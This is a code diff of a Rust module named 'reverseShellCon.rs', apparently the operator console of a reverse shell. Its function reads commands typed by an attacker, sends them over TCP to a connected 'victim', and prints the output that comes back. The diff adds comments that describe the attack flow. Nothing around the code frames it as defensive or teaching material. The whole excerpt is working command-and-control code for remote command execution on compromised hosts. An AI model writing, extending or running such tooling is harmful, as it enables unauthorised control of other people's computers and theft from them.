@@ -1,3 +1,4 @@
+// reverseShellCon.rs (module)
 use std::io::{self, BufRead, BufReader, Write};
 use std::net::{TcpListener, TcpStream};
 
@@ -22,30 +23,31 @@ fn handle_victim(mut stream: TcpStream) -> Result<(), io::Error> {
     let mut reader = BufReader::new(stream.try_clone()?);
 
     loop {
+        // Prompt the user to enter a command to send to the victim
         print!("Enter command to send to victim (or 'exit' to disconnect): ");
-        io::stdout().flush()?;
+        io::stdout().flush()?; // Ensure prompt is displayed
         let mut command = String::new();
-        io::stdin().read_line(&mut command)?;
+        io::stdin().read_line(&mut command)?; // Read input from the attacker
 
         let command = command.trim();
         if command.eq_ignore_ascii_case("exit") {
             println!("Disconnecting from victim...");
-            break;
+            break; // End the session if 'exit' is typed
         }
 
-        // Send the command
+        // Send the command to the victim
         stream.write_all(command.as_bytes())?;
         stream.write_all(b"\n")?;
 
-        // Read the response
+        // Read the victim's response and print it
         let mut response = String::new();
         reader.read_line(&mut response)?;
         if response.is_empty() {
             println!("Victim disconnected.");
-            break;
+            break; // Exit the loop if no response (victim disconnected)
         }
 
-        println!("Response:\n{}", response);
+        println!("Response:\n{}", response); // Display the response from the victim
     }
 
     Ok(())
